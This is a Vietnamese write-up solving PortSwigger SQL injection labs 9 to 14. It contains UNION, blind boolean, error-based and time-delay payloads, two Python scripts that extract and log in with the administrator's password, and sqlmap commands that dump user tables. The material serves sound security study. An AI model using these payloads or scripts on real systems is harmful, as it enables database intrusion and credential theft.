![ảnh](https://hackmd.io/_uploads/r15xxirn6.png)

- và mình có thể xem cũng như lưu dữ liệu từ các database này

## 9. Lab: SQL injection attack, listing the database contents on Oracle

link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

### Đề bài

![image](https://hackmd.io/_uploads/ByvhHT25a.png)

### Phân tích

- Bài lab này tương tự bài trên, chỉ khác là tấn công SQLi đối với Oracle database.

### Khai thác

- Tương tự, ta cũng xác định được số cột trả về của câu query là 2. Kiểm tra cách hiển thị bằng payload trên hình: `/filter?category=' UNION SELECT NULL, NULL FROM dual--`

![image](https://hackmd.io/_uploads/H13i8p39p.png)

Như vậy câu lệnh truy vấn trả về 2 cột dữ liệu. Tìm kiểm cột dữ liệu tương thích với kiểu chuỗi, payload: `/filter?category=' UNION SELECT 'column1', 'column2' FROM dual--`

![image](https://hackmd.io/_uploads/HkQ-vTh9a.png)

Cả hai cột đều có thể sử dụng để hiển thị thông tin khai thác. Truy xuất tên các bảng, payload: `/filter?category=' UNION SELECT table_name, NULL FROM all_tables--`

![image](https://hackmd.io/_uploads/BJgtOwp35a.png)

Quan sát nhận thấy table **USERS_FBNLSL** có thể chứa thông tin tài khoản người dùng:

![image](https://hackmd.io/_uploads/SJV9PTn9T.png)

Truy xuất tên các cột trong bảng **USERS_FBNLSL**, payload: `/filter?category=' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_FBNLSL'--`

![image](https://hackmd.io/_uploads/HJ0HuT39T.png)

Truy xuất thông tin tài khoản administrator, payload: `/filter?category=' UNION SELECT USERNAME_TDOVKQ || ':' || PASSWORD_UUQWNQ, NULL FROM USERS_FBNLSL--`

![image](https://hackmd.io/_uploads/BJEQK629a.png)

mình đăng nhập với tài khoản admin **administrator:tt1gghpj0jq55i6rll1r** và giải quyết được bài lab này

![image](https://hackmd.io/_uploads/HkibjT39a.png)

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a9c003f044ba90e81833ad6004b000a.web-security-academy.net'

session = requests.Session()

# xác định số cột
for x in range(20):
    test_column = "' UNION SELECT " + "NULL," * x + "NULL FROM dual-- "
    params = {'category' : test_column,}
    response = session.get(url + "/filter",params=params,verify=False,)
    if(response.status_code == 200):
        print("bảng có số cột là: ", (x+1))
        break

payload = "' UNION SELECT table_name, NULL FROM all_tables--"
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)
pattern = r"USERS_\w{6}\b"
match = re.search(pattern, response.text)
table_user = match.group()
print(table_user)

payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '" + table_user + "'--"
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)
pattern = r"USERNAME_\w{6}\b"
match = re.search(pattern, response.text)
username_column = match.group()
print(username_column)
pattern = r"PASSWORD_\w{6}\b"
match = re.search(pattern, response.text)
passwod_column = match.group()
print(passwod_column)

payload = "' UNION SELECT " + username_column + " || ':' || " + passwod_column + ", NULL FROM " + table_user + "--"
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)

pattern = r"administrator:\w{20}\b"
match = re.search(pattern, response.text)
account = match.group()
username = account.split(':')[0]
password = account.split(':')[1]

response = session.get(
    url + "/login",
    verify=False,
)
soup = BeautifulSoup(response.text,'html.parser')
csrf= soup.find('input', {'name': 'csrf'})['value']
data= {
    'username' : username,
    'password' : password,
    'csrf' : csrf,
}
response = session.post(
    url + "/login",
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/H1zw9ahq6.png)

![image](https://hackmd.io/_uploads/Sk8d5p3qa.png)

mục đích của chúng ta đã hoàn thành và mình đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/B1HYqpn9a.png)

### SQLMAP

- mình đã làm lại bài này với sqlmap
- đầu tiên mình chạy tấn công mặc định và tìm tên database có trong cơ sở dữ liệu bằng lệnh

```sql!
sqlmap -u https://0a4c00480391416d861fc53400890015.web-security-academy.net/filter?category=Gifts  --batch --dbs
```

![ảnh](https://hackmd.io/_uploads/BJY8eAH26.png)

- tấn công với chế độ mặc định --batch khá lâu và sqlmap gợi ý mình chạy với option --threads vì mình đang chạy single-thread
- sqlmap cho biết CSDL ở đây là Oracle nên mình chỉ loại CSDL luôn cho sqlmap là --dbms=Oracle
- cùng với đó mình chỉnh từ chế độ tấn công default "BEUSTQ" trên sqlmap sang --technique=U là kiểu tấn công UNION với lệnh sau

```sql!
sqlmap -u https://0a4c00480391416d861fc53400890015.web-security-academy.net/filter?category=Gifts  --batch --dbms=Oracle  -dbs --threads=10 --technique=U
```

![ảnh](https://hackmd.io/_uploads/B1LkGAS3p.png)

- và mình sqlmap có thể tấn công UNION

![ảnh](https://hackmd.io/_uploads/H1JDb0ShT.png)

- cùng với đó mình được 7 database

- mình vào từng database và xem các tables cho đến database **PETER** và nó là database mình cần tìm

```sql!
sqlmap -u https://0a4c00480391416d861fc53400890015.web-security-academy.net/filter?category=Gifts  --batch --dbms=Oracle  -D PETER --tables
```

![ảnh](https://hackmd.io/_uploads/B1XzNCS3p.png)

mình thấy có table **USERS_VPHRXN** có thể chứa các users

- để kiểm tra mình xem các cột của bảng này bằng lệnh

```sql!
sqlmap -u https://0a4c00480391416d861fc53400890015.web-security-academy.net/filter?category=Gifts  --batch --dbms=Oracle  -D PETER -T USERS_VPHRXN --columns
```

![ảnh](https://hackmd.io/_uploads/SJTq4CHnp.png)

và mình thấy có username và password

- mình dump ra thông tin của bảng này bằng lệnh

```sql!
sqlmap -u https://0a4c00480391416d861fc53400890015.web-security-academy.net/filter?category=Gifts  --batch --dbms=Oracle  -D PETER -T USERS_VPHRXN --dump
```

![ảnh](https://hackmd.io/_uploads/Hy21HASh6.png)

và mình được mật khẩu của admin là **jvabuznksyj30h0zg1ey**

- đem đi dăng nhập và mình solve được lab này

![ảnh](https://hackmd.io/_uploads/rkp4BRSh6.png)

## 10. Lab: SQL injection UNION attack, retrieving multiple values in a single column

link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

### Đề bài

![image](https://hackmd.io/_uploads/H1ZdQkpca.png)

### Phân tích

- Lab này yêu cầu mình thực hiện tấn công SQL Injection bằng UNION với mục đích lấy ra được nhiều thông tin ra chỉ trong một cột, mà ở đây là lấy được thông tin của username và password trong bảng user
- mình gửi single quote và nhận phản hồi lỗi 500 từ phía server cho thấy web này có thể dính lỗi sqli

![image](https://hackmd.io/_uploads/rJN_En39p.png)

### Khai thác

- Kiểm tra số cột dữ liệu trả về của câu lệnh truy vấn. Payload: `/filter?category=' UNION SELECT NULL, NULL--`

![image](https://hackmd.io/_uploads/rk7dV1p9p.png)

- Như vậy câu lệnh truy vấn trả về 2 cột dữ liệu. Tiếp theo tìm kiếm cột dữ liệu tương thích với kiểu string. Payload `/filter?category=' UNION SELECT NULL, 'column2'--` và `/filter?category=' UNION SELECT 'column1', NULL--`. Ở đây chỉ có cột 2 có thể lợi dụng để hiển thị thông tin khai thác:

![image](https://hackmd.io/_uploads/ryQTVyT56.png)

- Do chúng ta đã biết tên bảng cần khai thác là users cũng với hai cột có tên là username và password, nên ta có kết hợp nối chuỗi để hiển thị đồng thời hai cột dữ liệu username và password. Payload: `/filter?category=' UNION SELECT NULL, username || ':' || password FROM users--`

![image](https://hackmd.io/_uploads/SyRzHy6ca.png)

mình đăng nhập với tài khoản admin **administrator:pu5b8cpq50omjmv55wlh** và giải quyết được bài lab này

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a9300f4042bb4a480598fa700c60034.web-security-academy.net'

session = requests.Session()

# xác định số cột
for x in range(20):
    test_column = "' UNION SELECT " + "NULL," * x + "NULL -- "
    params = {'category' : test_column,}
    response = session.get(url + "/filter",params=params,verify=False,)
    if(response.status_code == 200):
        print("bảng có số cột là: ", (x+1))
        break


payload = "' UNION SELECT NULL, username || ':' || password FROM users--"
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)

pattern = r"administrator:\w{20}\b"
match = re.search(pattern, response.text)
account = match.group()
username = account.split(':')[0]
password = account.split(':')[1]

response = session.get(
    url + "/login",
    verify=False,
)
soup = BeautifulSoup(response.text,'html.parser')
csrf= soup.find('input', {'name': 'csrf'})['value']
data= {
    'username' : username,
    'password' : password,
    'csrf' : csrf,
}
response = session.post(
    url + "/login",
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)

```

![image](https://hackmd.io/_uploads/Hk7MLypc6.png)

mục đích của chúng ta đã hoàn thành và mình đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/HyvbUkpcT.png)

### SQLMAP

- mình đã làm lại bài này với sqlmap
- đầu tiên mình chạy tấn công mặc định và tìm tên database có trong cơ sở dữ liệu bằng lệnh

```sql!
sqlmap -u https://0a680001038bc2a3848eb5d5009f00db.web-security-academy.net/filter?category=Lifestyle  --batch --dbs
```

- mình được database **public**

![ảnh](https://hackmd.io/_uploads/r1eaLCrha.png)

cùng với đó biết được lab dùng CSDL PostgreSQL và có thể tấn công bằng UNION query

![ảnh](https://hackmd.io/_uploads/H1i080S3T.png)

- mình thấy những bài trước username và password được lưu ở database public nên mình vào database này và xem các bảng bằng lệnh

```sql!
sqlmap -u https://0a680001038bc2a3848eb5d5009f00db.web-security-academy.net/filter?category=Lifestyle  --batch -D public --tables

```

![ảnh](https://hackmd.io/_uploads/H1UHw0Bha.png)

- mình được 2 bảng trong đó có **users**
- mình vào bảng này và thử xem các cột có trường password không bằng lệnh

```sql!
sqlmap -u https://0a680001038bc2a3848eb5d5009f00db.web-security-academy.net/filter?category=Lifestyle  --batch -D public -T users --columns
```

và mình thấy có cột **password**

![ảnh](https://hackmd.io/_uploads/rkyqvRBn6.png)

tiếp theo mình dump bảng này ra và đọc thông tin bằng lệnh

```sql!
sqlmap -u https://0a680001038bc2a3848eb5d5009f00db.web-security-academy.net/filter?category=Lifestyle  --batch -D public -T users --dump
```

![ảnh](https://hackmd.io/_uploads/r11avRS26.png)

mình được password của admin là **vqusjmqjv6jtctl3o5bo**

- đem đi đăng nhập và mình solve được lab này

![ảnh](https://hackmd.io/_uploads/SkJMOCr36.png)

## 11. Lab: Blind SQL injection with conditional responses

link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

### Đề bài

![image](https://hackmd.io/_uploads/SJpH3yp9a.png)

### Phân tích

- Trang web chứa lỗ hổng SQL injection dạng Blind khi phân tích và thực hiện truy vấn SQL bằng cookie theo dõi (tracking cookie), trong câu truy vấn có chứa giá trị của cookie đã gửi. Kết quả của lệnh truy vấn SQL không được hiển thị, tuy nhiên ứng dụng sẽ hiển thị thông báo Welcome back! trong giao diện nếu truy vấn trả về dữ liệu hợp lệ. Chúng ta cần khai thắc lỗ hổng nhằm tìm kiếm mật khẩu tài khoản administrator, biết rằng trong cơ sở dữ liệu chứa bảng users, gồm cột username và password.
- Một "tracking cookie" là một loại cookie web được sử dụng để theo dõi hoạt động của người dùng trên trang web. Tracking cookies được thiết kế để thu thập thông tin về hành vi của người dùng trực tuyến, chẳng hạn như trang web họ truy cập, thời gian họ dành trên mỗi trang, quảng cáo họ nhấp vào, và nhiều thông tin khác, trang web thường sử dụng tracking cookies để tạo ra hồ sơ người dùng, giúp họ hiểu rõ hơn về sở thích và thói quen của người dùng
- Vì đây là blind SQL Injection, nên việc dùng UNION là khá khó khăn do không nhìn thấy được kết quả của query, việc tìm mật khẩu của admin sẽ chủ yếu là tìm từng từ một, và sử dụng tab Intruder của BurpSuite
- Chúng ta đã biết trang web chứa lỗ hổng Blind SQL injection tại cookie TrackingId.

![image](https://hackmd.io/_uploads/Hkip6Jpqp.png)

sử dụng payload `TrackingId=i1tocu3g9YsLbvCq' and 1=1--` , một dòng chữ Welcome back! xuất hiện. Như vậy nếu như điều kiện query đúng thì Welcome back! sẽ được hiển thị.

![image](https://hackmd.io/_uploads/rJmv1e6ca.png)

sử dụng payload `TrackingId=i1tocu3g9YsLbvCq' and 1=2--` , dòng chữ Welcome back! sẽ không xuất hiện

![image](https://hackmd.io/_uploads/B1aNylaq6.png)

Như ta có thể thấy, việc truy vấn thành công do trang web hiện về cho mình chữ "Welcome back", nghĩa là giờ cách làm của bài này sẽ là: truyền vào một câu query, nếu nó đúng thì sẽ trả về "Welcome back", còn nếu nó không đúng thì nó sẽ không trả về gì

### Khai thác

- đề bài đã biết tên tài khoản là 'administrator', việc đầu tiên cần làm là xem liệu mật khẩu dài bao nhiêu ký tự
- chúng ta có thể tạo payload kiểm tra độ dài mật khẩu này như sau:
- `'+and+(select+'a'+from+users+where+username='administrator'+and+length(password)>1)='a'--+-`
  sẽ chọn ra chữ a nếu trong bảng users có username là administrator và độ dài của password lớn hơn 1. Điều này có nghĩa chỉ khi cả 2 yếu tố là trong bảng users có username là administrator và độ dài của password lớn hơn 1 thì câu lệnh này mới là đúng, và trang web mới trả về chữ "Welcome back".
- hoặc

```sql
' AND LENGTH(CAST((SELECT password FROM users WHERE username='administrator') AS varchar))=1--
```

Hàm CAST() có tác dụng chuyển kết quả lệnh truy vấn sang dạng varchar. Từ đây chúng ta xác định được độ dài mật khẩu này bằng 20, sử dụng chức năng Intruder trong Burp Suite:

![image](https://hackmd.io/_uploads/HySsMlTc6.png)

![image](https://hackmd.io/_uploads/rJi9Mgpca.png)

- và mình vào grep extract thêm phần theo dõi comment "Welcome back!"

![image](https://hackmd.io/_uploads/S1AtMxT96.png)

- với giá trị 20, dòng chữ Welcome back! đã hiển thị → password dài 20 kí tự. Như vậy ta đã có được độ dài của mật khẩu, mình sẽ sử dụng tab intruder để bruteforce lấy từng ký tự trong mật khẩu của admin bằng câu query

![image](https://hackmd.io/_uploads/S14AGgTcp.png)

- sử dụng hàm SUBSTRING() xây dựng payload xác định từng ký tự của mật khẩu như sau:

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a' -- -
```

- sử dụng wordlist là các kí tự từ [a-z0-9]
- Với vị trí lấy xâu con chạy từ 1 đến 20, còn chữ cái thử là chữ thường a-z và số 0-9. Chọn mode ClusterBomb và bắt đầu bruteforce

![image](https://hackmd.io/_uploads/HJsm8e65a.png)

![image](https://hackmd.io/_uploads/HJY7rgTca.png)

![image](https://hackmd.io/_uploads/B1gmIg6qa.png)

- Chỉ cần có trường hợp nào trả về welcome back thì đó chính là ký tự đúng trong password của admin

sau hơn 2h đợi bruteforce mình được password là: **oeaor9jnzxye3u0shjdv**

![image](https://hackmd.io/_uploads/rk_xiMp56.png)

Khi đó ta có tài khoản **`administrator:oeaor9jnzxye3u0shjdv`** và đăng nhập để solve challenge.

![image](https://hackmd.io/_uploads/HJ4MdMTc6.png)

### SQLMAP

- mình đã làm lại bài này với sqlmap
- đầu tiên mình chạy tấn công mặc định và tìm tên database có trong cơ sở dữ liệu bằng lệnh

```sql!
sqlmap -u https://0a9f00940340be4885b38a3300190019.web-security-academy.net/filter?category=Lifestyle  --batch --threads=10
```

![ảnh](https://hackmd.io/_uploads/H1JZhCrna.png)

và sqlmap thông baos parameter category không thể inject được và mình đã chuyển hướng tấn công qua cookies là trường còn lại mà mình có thể kiểm soát bằng lệnh

![ảnh](https://hackmd.io/_uploads/B1voC0rhp.png)

```sql!
sqlmap  -u "https://0a9f00940340be4885b38a3300190019.web-security-academy.net/" --cookie "TrackingId=CriZQLZY2rgTxcbl*; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z" --technique=B --threads=10 --batch
```

sqlmap sẽ inject vào ký tự **"\*"** với kiểu tấn công mình chọn là Blind

![ảnh](https://hackmd.io/_uploads/r1zV1yUn6.png)

sqlmap thông báo có thể inject vào cookie với -string="Welcome back!"

- và CSDL ở đây dùng là **PostgreSQL**
- cùng với đó mình có thể tấn công theo kiểu **boolean-based blind** với Payload: `TrackingId=CriZQLZY2rgTxcbl' AND 3593=3593 AND 'MmVS'='MmVS; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z`

tiếp theo mình liệt kê database sử dụng trong CSDL này bằng lệnh

```sql!
sqlmap  -u "https://0a9f00940340be4885b38a3300190019.web-security-academy.net/" --cookie "TrackingId=CriZQLZY2rgTxcbl*; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z" --technique=B --threads=10 --dbs  --batch
```

![ảnh](https://hackmd.io/_uploads/HJIBlyI2T.png)

- mình được 3 database **public**, **pg_catalog**
  và **information_schema**

- mình thấy những bài trước username và password được lưu ơr database public nên mình vào database này và xem các bảng bằng lệnh

```sql!
sqlmap  -u "https://0a9f00940340be4885b38a3300190019.web-security-academy.net/" --cookie "TrackingId=CriZQLZY2rgTxcbl*; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z" --technique=B --threads=10 -D public --tables   --batch
```

![ảnh](https://hackmd.io/_uploads/Sk47-y82T.png)

- mình được 2 bảng trong đó có table users

mình liệt kê các cột trong table này xem có cột password không bằng lệnh

```sql!
sqlmap  -u "https://0a9f00940340be4885b38a3300190019.web-security-academy.net/" --cookie "TrackingId=CriZQLZY2rgTxcbl*; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z" --technique=B --threads=10 -D public -T users --columns    --batch
```

![ảnh](https://hackmd.io/_uploads/ry7yGyInT.png)

- có thông tin chúng ta cần mình dump bảng này ra bằng lệnh

```sql!
sqlmap  -u "https://0a9f00940340be4885b38a3300190019.web-security-academy.net/" --cookie "TrackingId=CriZQLZY2rgTxcbl*; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z" --technique=B --threads=10 -D public -T users --dump --batch
```

![ảnh](https://hackmd.io/_uploads/Hy-jM1U2p.png)

- và mình được password của admin là **9l94sbklfpb3wthbet9k**
- mình đem đi đăng nhập và solve được lab này

![ảnh](https://hackmd.io/_uploads/Skb1QkInT.png)

- phải nói dùng SQLMAP khá tiện và nhanh so với cách trên mình làm phải đợi hơn 2h để burp suite dò ra mật khẩu của admin

## 12. Lab: Blind SQL injection with conditional errors

link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

### Đề bài

![image](https://hackmd.io/_uploads/BkGCjn6cT.png)

### Phân tích

- Lab trên có chứa lỗ hổng blind SQL Injection trong quá trình lưu trữ và phân tích cookie, đồng thời thực hiện một câu lệnh SQL có chứa giá trị của cookie đó
- Kết quả của câu query không được hiện ra, và trang web cũng không trả về bất cứ thứ gì trong trường hợp query có trả về hàng nào hay không. Nhưng nếu câu lệnh SQL query không thực thi được thì ứng dụng sẽ trả về thông báo lỗi
- Trong CSDL của trang web có chứa một bảng là users, với 2 cột là username và password. Nhiệm vụ của chúng ta là đăng nhập với tư cách là administrator.
- Ta sẽ không thể làm việc như lab bên trên nữa vì dù query có trả về hàng hay không thì trang web cũng không hề show ra bất kỳ thứ gì, nên ta cần phải phải tiếp cận theo một hướng khác, đó là cố tình biến câu query thành sai để trang web báo lỗi.
- Trang web không chứa dấu hiệu thông báo nào. Kiểm tra cookie TrackingId, thêm ký tự `'` vào sau, response trả về error:

![image](https://hackmd.io/_uploads/r1OKjnpcp.png)

Đầu tiên ta cần xác định xem dạng CSDL của trang web là gì

![image](https://hackmd.io/_uploads/ByVLh3Tca.png)

- Đối với truy vấn con `' || (SELECT 'a' FROM dual)--` không trả về error, điều này chứng tỏ trang web đang sử dụng hệ quản trị cơ sở dữ liệu Oracle

- Trước tiên, ta đi xác định số cột trả về của query bằng UNION với payload : `' UNION SELECT null from dual --`.

![image](https://hackmd.io/_uploads/ryuCRh6qT.png)

vậy bảng này có 1 cột

- Ngoài ra, ta còn xác định được cột trả về có kiểu dữ liệu chuỗi thay vì dạng số nhờ 2 payload ở 2 hình dưới đây:

![image](https://hackmd.io/_uploads/BkVXkT6qT.png)

![image](https://hackmd.io/_uploads/HJ2Sy66cp.png)

### Khai thác

- Chúng ta đã có thông tin về tên bảng là users cùng với 2 cột là username và password, cần tìm kiếm mật khẩu người dùng administrator. Trước hết, xây dựng payload kiểm tra độ dài password: `'||(SELECT+CASE+WHEN+LENGTH(password)=1+THEN+to_char(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')--`

Tương tự bài trên, ta sẽ đi tìm độ dài của password trước với payload như hình dưới. Dùng Intruder để bruteforce độ dài, với wordlist mình chọn là từ 17→21

![image](https://hackmd.io/_uploads/rJL2x6p96.png)

![image](https://hackmd.io/_uploads/Byhse6656.png)

Kết quả với độ dài 20 thì server trả lỗi → password dài 20 kí tự.

- Bây giờ, ta sẽ đi bruteforce từng kí tự của password bằng câu điều kiện với hàm substr() (Tương tự bài trên)
- payload kiểm tra ký tự đầu tiên: `'||(SELECT+CASE+WHEN+SUBSTR(password,1,1)='a'+THEN+to_char(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')--`

Khi điều kiện kiểm tra WHEN đúng thì phép tính `1/0` được thực hiện dẫn đến error

![image](https://hackmd.io/_uploads/H1ERzpT56.png)

![image](https://hackmd.io/_uploads/HJh0zp6ca.png)

![image](https://hackmd.io/_uploads/HyEymTTcp.png)

Chỉ cần có trường hợp nào trả về error 500 thì đó chính là ký tự đúng trong password của admin

- sau hơn 2h đợi bruteforce mình được password là: **bnzw5hf3nhqa7dg5swd2**

![image](https://hackmd.io/_uploads/Sy8T-1Cqp.png)

Khi đó ta có tài khoản **`administrator:bnzw5hf3nhqa7dg5swd2`** và đăng nhập để solve challenge.

![image](https://hackmd.io/_uploads/H1xiW1CqT.png)

### SQLMAP

- mình đã làm lại bài này với sqlmap
- tương tự bài trên mình dùng lệnh sau để quét

```sql!
sqlmap  -u "https://0a3f00e103d9e2fb801e03dd00ca00f7.web-security-academy.net/" --cookie "TrackingId=jfOiVh13j5cygBd0*; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1" --technique=B --threads=10  --batch
```

![ảnh](https://hackmd.io/_uploads/Skjo5y82a.png)

nhưng sqlmap không thể detect ra boolean-base ở thông báo lỗi trả về trên http

- nên mình dùng lệnh sau để nâng số payload lên và quét chi tiết hơn

```sql!
sqlmap  -u "https://0a3f00e103d9e2fb801e03dd00ca00f7.web-security-academy.net/" --cookie "TrackingId=jfOiVh13j5cygBd0*; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1" --dbms=Oracle --technique=B --threads=10 --risk=3 --level=5 --batch
```

![ảnh](https://hackmd.io/_uploads/rJKFKyUna.png)

và sqlmap hiểu được boolean-base tại **--code=200** với Payload: `TrackingId=jfOiVh13j5cygBd0' AND (SELECT (CASE WHEN (2179=2179) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2179) END) FROM DUAL) IS NULL-- wIeK; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1` trên CSDL Oracle

tiếp theo mình dùng lệnh sau để liệt kê ra các database được dùng trong bài này

```sql!
sqlmap  -u "https://0a3f00e103d9e2fb801e03dd00ca00f7.web-security-academy.net/" --cookie "TrackingId=jfOiVh13j5cygBd0*; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1" --dbms=Oracle --technique=B --threads=10 --risk=3 --level=5 --batch --dbs
```

![ảnh](https://hackmd.io/_uploads/B1NOiyLhT.png)

đang chạy thì bị mất kết nối thật là bất ổn và mình tiếp tục không được cùng với đó trang web bị đơ không load được

- sqlmap đề xuất mình giảm số threads xuống

mình bỏ đi flag --threads và mặc định nó chạy sẽ là 1

```sql!
sqlmap  -u "https://0a3f00e103d9e2fb801e03dd00ca00f7.web-security-academy.net/" --cookie "TrackingId=jfOiVh13j5cygBd0*; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1" --dbms=Oracle --technique=B  --risk=3 --level=5 --batch --dbs
```

![ảnh](https://hackmd.io/_uploads/SyCdleIhT.png)

và nó dò tên database khá là lâu nhưng mình thấy có database **AP** và **EX_0400** chưa dò xong và thấy khá quen với 1 bài dùng database Oracle ở trên (9. Lab: SQL injection attack, listing the database contents on Oracle) và mình quay lên bài đó thấy bảng users được lưu trong database **PETER** và thử truy xuất nó bằng lệnh

```sql!
sqlmap  -u "https://0a3f00e103d9e2fb801e03dd00ca00f7.web-security-academy.net/" --cookie "TrackingId=jfOiVh13j5cygBd0*; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1" --dbms=Oracle --technique=B  --risk=3 --level=5 --batch -D PETER -T  users --dump  --threads=10
```

![ảnh](https://hackmd.io/_uploads/B1gNblU2p.png)

- thật may nó đã hoạt động và mình có mật khẩu của admin là **awt0xuq33jg04y2hvkun**
- mình đi đăng nhập và solve được lab này

![ảnh](https://hackmd.io/_uploads/BkKY-xLnp.png)

## 13. Lab: Blind SQL injection with time delays

link: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

### Đề bài

![image](https://hackmd.io/_uploads/S1lPjaac6.png)

### Phân tích

- Đặt ra giả thiết rằng, nhóm phát triển sản phẩm đã nghĩ tới trường hợp trong quá trình vận hành, câu truy vấn trang web sử dụng có thể xảy ra lỗi nên họ đã xử lý khéo léo bằng cú pháp TRY/CATCH
- Cách làm này khiến chúng ta không thể dựa vào trạng thái error trong response để kiểm tra tính đúng sai của câu truy vấn con. Lưu ý rằng tuy không có "dấu hiệu" nhận biết nào, nhưng câu truy vấn con của chúng ta thực tế vẫn được hệ thống thực thi. Dựa vào điều này, chúng ta cần tự tạo ra một "dấu hiệu" bằng chính câu truy vấn chúng ta có thể điều khiển tùy ý. Một trong những cách thường được kẻ tấn công sử dụng là kích hoạt độ trễ thời gian (times delay) có điều kiện.
- Trang web chứa lỗ hổng SQL injection dạng Blind khi phân tích và thực hiện truy vấn SQL bằng cookie theo dõi (tracking cookie), trong câu truy vấn có chứa giá trị của cookie đã gửi. Kết quả của lệnh truy vấn SQL không được hiển thị, và cũng không còn các dấu hiệu thông báo, không tồn tại trường hợp khiến response trả về error. Tuy nhiên, vì câu truy vấn được thực thi đồng bộ nên có khai thác thác bằng phương pháp triggering times delay. Để giải quyết bài lab, chúng ta cần tấn công lỗ hổng khiến trang web bị delay 10 giây trước khi trả về phản hồi tới người dùng.

### Khai thác

- Đây là bài lab yêu cầu sử dụng Time-based để tấn công Blind SQLi. Ta sẽ thực hiện đi tìm hệ quản trị database mà ứng dụng sử dụng bằng cách thử các cách Time-based khác nhau của từng loại hệ quản trị. Mình đã thử cho đến khi sử dụng syntax của PostgreSQL, chúng ta xác định được trang web sử dụng PostgreSQL, một số payload có thể sử dụng như sau:

```sql=
'; SELECT pg_sleep(10)-- // Để phân biệt với các giá trị cookie khác
'||pg_sleep(10)-- // Để nối chuỗi
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Cả 3 payload này đều có thể khiến response delay 10s trước khi hiển thị kết quả ta đã solve thành công.

![image](https://hackmd.io/_uploads/HJdLxATcp.png)

### SQLMAP

- mình đã làm lại bài này với sqlmap
- mình dùng lệnh sau để tấn công mặc định với sqlmap

```sql!
sqlmap  -u "https://0a3000f303d5e6ea80a8e48800d1001d.web-security-academy.net/filter?category=Pets"  --batch
```

![ảnh](https://hackmd.io/_uploads/BJ7B6fUnp.png)

và sqlmap thông báo parameter category có thể ko bị injection và mình chuyển hướng sang trường cookie chúng ta có thể kiểm soát bằng lệnh

```sql!
sqlmap  -u "https://0a3000f303d5e6ea80a8e48800d1001d.web-security-academy.net/" --cookie "TrackingId=qSyWsQwsSq66c7DU*; session=8DwrlFLfWdx3WhavBPhQbEEX8LifAo" --batch
```

![ảnh](https://hackmd.io/_uploads/r1A_Cz8ha.png)

- mình được CSDL ở đây là PostgreSQL và mình có thể tấn công stacked queries và thực hiện time-base injection với Payload: `TrackingId=qSyWsQwsSq66c7DU';SELECT PG_SLEEP(5)--; session=8DwrlFLfWdx3WhavBPhQbEEX8LifAo`

đề bài yêu cầu mình làm trễ 10 giậy nên mình sẽ dùng `;SELECT PG_SLEEP(10)--`

gửi nó

![ảnh](https://hackmd.io/_uploads/HyoOg7Inp.png)

và mình solve được lab này

![ảnh](https://hackmd.io/_uploads/r1R5xQ82T.png)

## 14. Lab: Blind SQL injection with time delays and information retrieval

link: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

### Đề bài

![image](https://hackmd.io/_uploads/HyJlbATqa.png)

### Phân tích

- Trang web chứa lỗ hổng SQL injection dạng Blind khi phân tích và thực hiện truy vấn SQL bằng cookie theo dõi (tracking cookie), trong câu truy vấn có chứa giá trị của cookie đã gửi. Kết quả của lệnh truy vấn SQL không được hiển thị, và cũng không còn các dấu hiệu thông báo, không tồn tại trường hợp khiến response trả về error. Tuy nhiên, vì câu truy vấn được thực thi đồng bộ nên có thể khai thác thác bằng phương pháp triggering times delay. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm tìm kiếm mật khẩu tài khoản administrator, biết rằng trong cơ sở dữ liệu chứa bảng users, gồm cột username và password.
- Xác định cookie TrackingId chứa lỗ hổng Blind SQL injection có thể khai thác bằng phương pháp kích hoạt times delay ứng với hệ cơ sở dữ liệu PostgreSQL, payload: `'||pg_sleep(10)--`

### Khai thác

- Lúc này ta sẽ đi tìm password của user administrator từ bảng users. Ta sẽ thử kiểm tra LENGTH(password) trước với payload

```sql!
'; SELECT CASE WHEN (LENGTH(password)=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

![image](https://hackmd.io/_uploads/Hy-teVAc6.png)

